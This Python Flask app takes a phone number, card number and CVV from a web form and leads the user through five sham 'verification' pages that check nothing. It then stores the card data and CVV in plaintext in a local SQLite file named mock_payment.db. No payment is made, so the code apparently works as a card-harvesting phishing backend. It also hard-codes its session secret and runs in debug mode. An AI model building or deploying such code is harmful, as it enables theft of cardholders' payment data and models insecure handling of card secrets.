
from flask import Flask, render_template, request, redirect, url_for, session
from datetime import datetime
import sqlite3
import os

app = Flask(__name__)
app.secret_key = 'secret_key_for_session'

# قاعدة البيانات
DATABASE = 'mock_payment.db'

def init_db():
    with sqlite3.connect(DATABASE) as conn:
        c = conn.cursor()
        c.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                phone TEXT,
                card_number TEXT,
                cvv TEXT,
                created_at TEXT
            )
        ''')
        conn.commit()

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        session['phone'] = request.form['phone']
        session['card'] = request.form['card']
        session['cvv'] = request.form['cvv']
        return redirect(url_for('verify', step=1))
    return render_template('form.html')

@app.route('/verify/<int:step>', methods=['GET', 'POST'])
def verify(step):
    if step > 5:
        return redirect(url_for('success'))
    if request.method == 'POST':
        return redirect(url_for('verify', step=step+1))
    return render_template('verify.html', step=step)

@app.route('/success')
def success():
    with sqlite3.connect(DATABASE) as conn:
        c = conn.cursor()
        c.execute('INSERT INTO payments (phone, card_number, cvv, created_at) VALUES (?, ?, ?, ?)', (
            session.get('phone'),
            session.get('card'),
            session.get('cvv'),
            datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        ))
        conn.commit()
    session.clear()
    return render_template('success.html')

if __name__ == '__main__':
    init_db()
    app.run(debug=True)
